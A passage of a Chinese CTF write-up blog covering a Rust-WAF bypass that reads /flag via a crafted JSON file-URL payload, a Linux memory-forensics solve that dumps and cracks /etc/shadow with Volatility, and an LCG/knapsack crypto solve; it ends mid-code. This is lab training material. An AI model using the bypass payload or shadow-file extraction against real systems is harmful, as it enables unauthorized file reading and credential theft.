punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token comment">//not contains protocol,check if struct is File</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_str</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">File</span><span class="token operator">></span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">return</span> <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"./main.rs"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token comment">//body not json</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"./main.rs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token comment">// let args: Vec&lt;String> = env::args().collect();</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>google 了一下，发现 corctf 的某道题和这道题类似，也是 <code>fs.readfileSync</code> 并绕 waf，可以直接去看源码</p><p><img data-src="https://img-blog.csdnimg.cn/f9ddd86f095a4222a750ca5ce340e72e.png" alt="Untitled"></p><p>如果传入的 payload 不为空并且 <code>payload.href</code> 和 <code>payload.origin</code> 均有值，就会进入 <code>fileURLToPath(fileURLOrPath)</code></p><p><img data-src="https://img-blog.csdnimg.cn/55c9da370fc248acb52b7917b6276101.png" alt="Untitled"></p><p><code>payload.protocol</code> 为 <code>file:</code></p><p><img data-src="https://img-blog.csdnimg.cn/1826bcf6418c4e598b699fc4d88a7b53.png" alt="Untitled"></p><p>这里实现对 <code>payload.pathname</code> 的 url 解码并返回最后实现读取 <code>payload.pathname</code> 内容</p><p>注意这里要求 <code>payload.hostname</code> 为空</p><p><img data-src="https://img-blog.csdnimg.cn/5cdbd87679294843aabc9d21d5ee9424.png" alt="Untitled"></p><p>但是这里用到的 payload 中存在 protocol 导致 rust 能检测到，要绕过。payload:</p><pre><code>&#123;&quot;origin&quot;:&quot;*&quot;,&quot;href&quot;:&quot;*&quot;,&quot;pr\ud811otocol&quot;:&quot;file:&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/f%6cag&quot;&#125;
</code></pre><p><img data-src="https://img-blog.csdnimg.cn/1a47fbd1679d4d829b46c9c1a504be5b.png" alt="Untitled"></p><p>flag:</p><figure class="highlight rust"><figcaption data-lang="rust"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>5f53d536<span class="token operator">-</span>83ed<span class="token operator">-</span>41ec<span class="token operator">-</span>ae21<span class="token operator">-</span>939143a38066<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="reference"><a class="anchor" href="#reference">#</a> Reference</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy5ibXRoNjY2LmNuL2JtdGhfYmxvZy8yMDIyLzA5LzI3L1NwcmluZyVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQyVFNSVBRCVBNiVFNCVCOSVBMC8jU3ByaW5nJUU1JTg2JTg1JUU1JUFEJTk4JUU5JUE5JUFD">http://www.bmth666.cn/bmth_blog/2022/09/27/Spring 内存马学习 /#Spring 内存马</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU4NTc1I2gyLTI=">https://www.anquanke.com/post/id/258575#h2-2</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9teXp4Y2cuY29tLzIwMjEvMTEvU3ByaW5nLSVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQyVFNSVBRSU5RSVFNyU4RSVCMC8=">https://myzxcg.com/2021/11/Spring - 内存马实现 /</span></p><p><span class="exturl" data-url="aHR0cHM6Ly92aWJsby5hc2lhL3AvY29yY3RmLTIwMjItd3JpdGV1cC1wYXJ0LTEtbTY4WjBKb2o1a0cjX2MtY2hhbGxlbmdlLXNvbHV0aW9uLTM=">https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG#_c-challenge-solution-3</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vZGVqcy9ub2RlL2Jsb2IvbWFpbi9saWIvZnMuanMjTDQ2NA==">https://github.com/nodejs/node/blob/main/lib/fs.js#L464</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNzQxMDIuaHRt">https://bbs.pediy.com/thread-274102.htm</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhdmVkb2VzZGV2L3B5dGhvbi1qd3Q=">https://github.com/davedoesdev/python-jwt</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE0ODI0Mi5odG1sIzp+OnRleHQ9Z3JhcGhxbCVFNyU5QSU4NHNxbCVFNiVCMyVBOCVFNSU4NSVBNSVFNCVCOCU4RSVFNCVCOCU4MCVFOCU4OCVBQyVFNyU5QSU4NHNxbCVFNiVCMyVBOCVFNSU4NSVBNSVFNyVCMSVCQiVFNCVCQyVCQyVFRiVCQyU4QyVFOSU4MyVCRCVFNiU5OCVBRiVFNSU4RiVBRiVFNCVCQiVBNSVFOSU4MCU5QSVFOCVCRiU4NyVFNiU5RSU4NCVFOSU4MCVBMCVFNiU4MSVCNiVFNiU4NCU4RiVFOCVBRiVBRCVFNSU4RiVBNSVFOCVCRSVCRSVFNSU4OCVCMCVFNiVCMyVBOCVFNSU4NSVBNSVFOCU4RSVCNyVFNSU4RiU5NiVFNiU5NSVCMCVFNiU4RCVBRSVFNiU4OCU5NiVFNiU5NCVCOSVFNSU4RiU5OCVFNiU5RiVBNSVFOCVBRiVBMiVFOSU4MCVCQiVFOCVCRSU5MSVFNyU5QSU4NCVFNyU5QiVBRSVFNyU5QSU4NCVFMyU4MCU4MixwJUU3JUE1JTlFJUU1JTlDJUE4JUU1JTg1JTg4JUU3JTlGJUE1JUU1JUE0JUE3JUU0JUJDJTlBJUU0JUI4JThBJUU4JUFFJUIyJUU4JUJGJTg3JUU4JUFGJUE1JUU3JUIxJUJCJUU5JTk3JUFFJUU5JUEyJTk4JUVGJUJDJThDJUU1JTgwJTlGJUU3JTk0JUE4cCVFNyVBNSU5RSVFNyU5QSU4NDIlRTUlQkMlQTBQUFQlRTMlODAlODI=">https://www.secpulse.com/archives/148242.html</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ncmFwaHFsLmNuL2xlYXJuL3F1ZXJpZXMvI3ZhcmlhYmxlcw==">https://graphql.cn/learn/queries/#variables</span></p><h2 id="misc"><a class="anchor" href="#misc">#</a> MISC</h2><h3 id="strange_forensics"><a class="anchor" href="#strange_forensics">#</a> strange_forensics</h3><p><span class="exturl" data-url="aHR0cHM6Ly9mYWhyaWd1cmVzY2kuY29tL2NyZWF0ZS1zcGVjaWZpYy12b2xhdGlsaXR5LXByb2ZpbGUtYW5kLXN5bWJvbC10YWJsZS8=">学习链接 1</span></p><p>首先，是一个 linux 取证，需要得到这个镜像的版本号</p><p>使用命令 \ 这边只用 vol3 有这个命令，如果是对于 linux 取证的话</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#vol3</span></pre></td></tr><tr><td data-num="2"></td><td><pre>vol -f <span class="token number">1</span>.mem banners</pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/916e4c719f594b2a9f24d32ed9cb31c1.png" alt=""></p><p>得到版本</p><pre><code>Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)
</code></pre><p>然后我们要构建一个跟这个内核一样，记住是一模一样的内核。</p><h4 id="ps踩坑"><a class="anchor" href="#ps踩坑">#</a> ps: 踩坑</h4><p>这边就不能使用上面学习链接中的做法使用 vol3 去拉出内核，我具体原因也不知道是为什么，最后会导致本来好好的，amd64-007 变成 amd64-046</p><p>就使用字符表 + dwarf 的方式制作内核调试信息的文件</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjA4MTA1NS9hcnRpY2xlL2RldGFpbHMvMTIxODk3MzE5">学习链接 2</span></p><p>安装部分就不讲解了，我们需要去安装一个 18.04 的 ubuntu，在装完之后需要 uname -a 查看一下自己内核版本能不能对上，然后需要在这个 ubuntu 上下一个 volatility2，进行 dwarf 的编译</p><h4 id="1创建vtypes"><a class="anchor" href="#1创建vtypes">#</a> 1. 创建 vtypes</h4><pre><code>cd volatility/tools/linux
make
</code></pre><p><img data-src="https://img-blog.csdnimg.cn/9b692b57fea84a258a3dcd90a0367ce6.png" alt=""></p><h4 id="2获取符号表"><a class="anchor" href="#2获取符号表">#</a> 2. 获取符号表</h4><p>一般我们可以在 /boot 目录下找到该 System.map 文件。该文件包含系统的符号信息。</p><p><img data-src="https://img-blog.csdnimg.cn/e73e4b4c51d84fb8a82f0f28b025b2d6.png" alt=""></p><p>这个就是我们所需要的符号表了</p><h4 id="3制作用户配置文件"><a class="anchor" href="#3制作用户配置文件">#</a> 3. 制作用户配置文件</h4><p>将 moudle.dwarf 以及 system.map 文件打包成一个 zip 文件</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">zip</span> ./volatility/plugins/overlays/linux/Ubuntu.zip ./tools/linux/module.dwarf /boot/System.map-<span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> -r<span class="token variable">`</span></span></pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/246cef0600984aec81778868cb18bb44.png" alt=""></p><p>这样我们一个可以调试的内核就制作好了</p><h4 id="4-开始做题"><a class="anchor" href="#4-开始做题">#</a> 4、开始做题</h4><p>然后我们回到自己的 kali 虚拟机，使用 vol2，将 Ubuntu.zip 放到自己的 //volatility-master/volatility/plugins/linux/ 目录下</p><p>查看 info</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python2 vol.py --info</pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/1a9d3e183d2e4b40b65a42e65f20da52.png" alt=""></p><p>第一个就是，我们选用这个作为我们的 profiles</p><p>LinuxUbuntux64</p><p>分享一个师傅的 blog，里面有几篇关于 linux 取证的分析 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05GTVNSP3R5cGU9YmxvZw==">大佬博客</span></p><p>以及 linux 取证下的命令 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZvbGF0aWxpdHlmb3VuZGF0aW9uL3ZvbGF0aWxpdHk=">官网</span></p><p><img data-src="https://img-blog.csdnimg.cn/6dc3039764f64f56af329c104dd36321.png" alt=""></p><p>密码在 /etc/shadow 下</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python2 vol.py -f <span class="token number">1</span>.mem --profile<span class="token operator">=</span>LinuxUbuntux64 linux_enumerate_files <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'shadow'</span></pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/085ed0fd36834416bdd02bbdf5aff93e.png" alt=""></p><p>然后将这个文件 dump 下来</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python2 vol.py -f <span class="token number">1</span>.mem --profile<span class="token operator">=</span>LinuxUbuntux64 linux_find_file -i 0xffff97ce7444b448 -O shadow</pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/d520180f2eda473d9892f4ac8d8bfcfb.png" alt=""></p><p>拿到了</p><p><img data-src="https://img-blog.csdnimg.cn/06591491ff8041869fff632291fe92a2.png" alt=""></p><p>直接 somd5 解</p><p><img data-src="https://img-blog.csdnimg.cn/042adc3af7624cb4b9f70e1ccb97cf3a.png" alt=""></p><p>拿到密码</p><p>然后查看文件</p><p>恢复文件的元数据：包括 文件大小，MACtimes，权限，所有者，等等</p><p>为了获取完整的数据，命令必须以 root 权限运行</p><pre><code>python2 vol.py -f 1.mem --profile=LinuxUbuntux64 linux_recover_filesystem -D dum 
</code></pre><p><img data-src="https://img-blog.csdnimg.cn/cd7541d9e7a04ffbb9a782c873151111.png" alt=""></p><p>可以在 /home/bob/Desktop 目录下找到一个 secret.zip 文件</p><p>是一个伪无密，把两个加密数据块的 0000 改成 0900 就可以爆破了<img data-src="https://img-blog.csdnimg.cn/fc6f73a420ce454e92c55251712a92be.png" alt=""></p><p>爆破密码得到第二部分 flag</p><p><img data-src="https://img-blog.csdnimg.cn/b2fd4b1861004c92b82a1d86f3a0e67c.png" alt=""></p><p><img data-src="https://img-blog.csdnimg.cn/cdcbd4ba7b9f4735825fd092df1c9fa5.png" alt=""></p><pre><code>_y0u_Ar3_tHe_LIn
</code></pre><p>第三部分 flag，应该是非预期，直接在 010 里面搜索，flag3，就可以得到第三部分 flag</p><p><img data-src="https://img-blog.csdnimg.cn/a8a188b709eb4e14bb6a803d984a01d4.png" alt=""></p><p>最后得到完整的 flag</p><pre><code>flag&#123;890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER&#125;
</code></pre><p>从而可以引出更多的非预期</p><p>在 010 直接搜索 gdm-password，稍微翻一下，只有 110 个搜索</p><p>可以直接得到密码，gdm-password 是 root 密码</p><p><img data-src="https://img-blog.csdnimg.cn/81755b1b1cf144a98f74e1556ba5d0b8.png" alt=""></p><p>然后 binwalk -e 可以直接将 zip 分离出来，就是小心内存炸了，所以从理论上来说，这道题甚至不用配 profile。</p><h4 id="总结"><a class="anchor" href="#总结">#</a> 总结</h4><p>这题主要是考察 linux 镜像取证，主要难点就是配 linux 镜像，后面就没有什么难得了。</p><h2 id="crypto"><a class="anchor" href="#crypto">#</a> CRYPTO</h2><h4 id="fill"><a class="anchor" href="#fill">#</a> fill</h4><p><code>s[i] = (s[i-1]*m+c)%n</code></p><p>很容易想到 LCG（n,c 互素）</p><p>LCG 解得 m,c （后面发现 m 位数 &gt; 20 很奇怪）</p><p>然后求得 M</p><p>S 是 M 与 f_list 的点乘</p><p>f_list 是 0,1 数组</p><p>背包求解 f_list</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">crack_unknown_modulus</span><span class="token punctuation">(</span>states<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    diffs <span class="token operator">=</span> <span class="token punctuation">[</span>s1 <span class="token operator">-</span> s0 <span class="token keyword">for</span> s0<span class="token punctuation">,</span> s1 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>states<span class="token punctuation">,</span> states<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    zeroes <span class="token operator">=</span> <span class="token punctuation">[</span>t2<span class="token operator">*</span>t0 <span class="token operator">-</span> t1<span class="token operator">*</span>t1 <span class="token keyword">for</span> t0<span class="token punctuation">,</span> t1<span class="token punctuation">,</span> t2 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>diffs<span class="token punctuation">,</span> diffs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> diffs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    modulus <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">reduce</span><span class="token punctuation">(</span>gcd<span class="token punctuation">,</span> zeroes<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> crack_unknown_multiplier<span class="token punctuation">(</span>states<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">def</span> <span class="token function">crack_unknown_multiplier</span><span class="token punctuation">(</span>states<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    multiplier <span class="token operator">=</span> <span class="token punctuation">(</span>states<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> states<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> invert<span class="token punctuation">(</span>states<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> states<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> modulus<span class="token punctuation">)</span> <span class="token operator">%</span> modulus <span class="token comment"># 注意这里求逆元</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> crack_unknown_increment<span class="token punctuation">(</span>states<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> multiplier<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">def</span> <span class="token function">crack_unknown_increment</span><span class="token punctuation">(</span>states<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> multiplier<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    increment <span class="token operator">=</span> <span class="token punctuation">(</span>states<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> states<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>multiplier<span class="token punctuation">)</span> <span class="token operator">%</span> modulus</pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> modulus<span class="token punctuation">,</span> multiplier<span class="token punctuation">,</span> increment</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>state<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">562734112</span><span class="token punctuation">,</span><span class="token number">859151551</span><span class="token punctuation">,</span><span class="token number">741682801</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>crack_unknown_multiplier<span class="token punctuation">(</span>state<span class="token punctuation">,</span><span class="token number">991125622</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>n<span class="token operator">=</span><span class="token number">991125622</span></pre></td></tr><tr><td data-num="20"></td><td><pre>s<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span></pre></td></tr><tr><td data-num="21"></td><td><pre>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="22"></td><td><pre>n<span class="token operator">=</span><span class="token number">991125622</span></pre></td></tr><tr><td data-num="23"></td><td><pre>m<span class="token operator">=</span><span class="token number">55365664</span></pre></td></tr><tr><td data-num="24"></td><td><pre>c<span class="token operator">=</span><span class="token number">8712091</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>m<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token operator">%</span>n</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">#print(s)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>M <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">19621141192340</span><span class="token punctuation">,</span> <span class="token number">39617541681643</span><span class="token punctuation">,</span> <span class="token number">3004946591889</span><span class="token punctuation">,</span> <span class="token number">6231471734951</span><span class="token punctuation">,</span> <span class="token number">3703341368174</span><span class="token punctuation">,</span> <span class="token number">48859912097514</span><span class="token punctuation">,</span> <span class="token number">4386411556216</span><span class="token punctuation">,</span> <span class="token number">11028070476391</span><span class="token punctuation">,</span> <span class="token number">18637548953150</span><span class="token punctuation">,</span> <span class="token number">29985057892414</span><span class="token punctuation">,</span> <span class="token number">20689980879644</span><span class="token punctuation">,</span> <span class="token number">20060557946852</span><span class="token punctuation">,</span> <span class="token number">46908191806199</span><span class="token punctuation">,</span> <span class="token number">8849137870273</span><span class="token punctuation">,</span> <span class="token number">28637782510640</span><span class="token punctuation">,</span> <span class="token number">35930273563752</span><span class="token punctuation">,</span> <span class="token number">20695924342882</span><span class="token punctuation">,</span> <span class="token number">36660291028583</span><span class="token punctuation">,</span> <span class="token number">10923264012354</span><span class="token punctuation">,</span> <span class="token number">29810154308143</span><span class="token punctuation">,</span> <span class="token number">4444597606142</span><span class="token punctuation">,</span> <span class="token number">31802472725414</span><span class="token punctuation">,</span> <span class="token number">23368528779283</span><span class="token punctuation">,</span> <span class="token number">15179021971456</span><span class="token punctuation">,</span> <span class="token number">34642073901253</span><span class="token punctuation">,</span> <span class="token number">44824809996134</span><span class="token punctuation">,</span> <span class="token number">31243873675161</span><span class="token punctuation">,</span> <span class="token number">27159321498211</span><span class="token punctuation">,</span> <span class="token number">2220647072602</span><span class="token punctuation">,</span> <span class="token number">20255746235462</span><span class="token punctuation">,</span> <span class="token number">24667528459211</span><span class="token punctuation">,</span> <span class="token number">46916059974372</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">for</span> t <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    M<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> M<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">-</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>pk1 <span class="token operator">=</span> M</pre></td></tr><tr><td data-num="33"></td><td><pre>ct1 <span class="token operator">=</span> <span class="token number">492226042629702</span></pre></td></tr><tr><td data-num="34"></td><td><pre>nbit <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pk1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nbit <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nbit <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> nbit<span class="token punctuation">]</span> <span class="token operator">=</span> pk1<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="40"></td><td><pre>A<span class="token punctuation">[</span>nbit<span class="token punctuation">,</span> nbit<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>ct1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>res <span class="token operator">=</span> A<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>s<span class="token operator">=</span><span class="token string">'0b'</span></pre></td></tr><tr><td data-num="43"></td><td><pre>a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    s<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 